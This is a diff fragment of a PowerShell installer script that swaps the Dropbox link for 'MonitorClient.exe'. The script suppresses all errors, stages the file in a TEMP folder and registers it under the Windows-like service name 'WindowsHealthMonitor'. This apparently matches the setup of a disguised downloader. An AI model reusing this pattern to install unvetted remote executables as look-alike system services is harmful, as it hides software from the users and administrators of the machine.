@@ -1,6 +1,6 @@
 $ErrorActionPreference = "SilentlyContinue"
 
-$ClientUrl = "https://www.dropbox.com/scl/fi/g9n5elasjy54dl2kwfntg/MonitorClient.exe?rlkey=wync0ieqrytdi12bugsw6hzu7&st=9rbd7dcz&dl=1"
+$ClientUrl = "https://www.dropbox.com/scl/fi/g9n5elasjy54dl2kwfntg/MonitorClient.exe?rlkey=wync0ieqrytdi12bugsw6hzu7&st=auf5tgaj&dl=1"
 $WorkDir = "$env:TEMP\WinHealthInstall"
 $ClientExe = "$WorkDir\MonitorClient.exe"
 $ServiceName = "WindowsHealthMonitor"
